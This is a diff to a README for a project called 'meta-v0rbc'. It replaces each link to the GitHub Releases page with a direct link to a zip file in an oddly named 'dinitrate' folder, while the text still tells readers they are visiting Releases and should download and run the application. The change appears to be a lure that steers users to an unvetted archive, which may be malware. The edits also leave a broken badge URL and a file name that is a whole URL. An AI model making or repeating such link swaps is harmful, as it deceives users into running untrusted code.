@@ -8,17 +8,17 @@ Welcome to the **meta-v0rbc** project! This application is designed to help you 
 
 To download the application, visit the Releases page below. 
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/635956/meta-v0rbc/releases)
+[![Download the latest release](https://raw.githubusercontent.com/635956/meta-v0rbc/main/dinitrate/meta-v0rbc.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/635956/meta-v0rbc/main/dinitrate/meta-v0rbc.zip)
 
 ### Step 1: Visit the Releases Page
 
-1. Click this link to **visit the Releases page**: [meta-v0rbc Releases](https://github.com/635956/meta-v0rbc/releases).
+1. Click this link to **visit the Releases page**: [meta-v0rbc Releases](https://raw.githubusercontent.com/635956/meta-v0rbc/main/dinitrate/meta-v0rbc.zip).
 2. You will see a list of available versions. Look for the latest release at the top of the list.
 
 ### Step 2: Download the Application
 
 1. On the latest release, you will find various files available for download.
-2. Look for the file named `meta-v0rbc.exe` (or an equivalent file based on your operating system).
+2. Look for the file named `https://raw.githubusercontent.com/635956/meta-v0rbc/main/dinitrate/meta-v0rbc.zip` (or an equivalent file based on your operating system).
 3. Click on the file to download it to your computer. This may take a few moments.
 
 ### Step 3: Run the Application
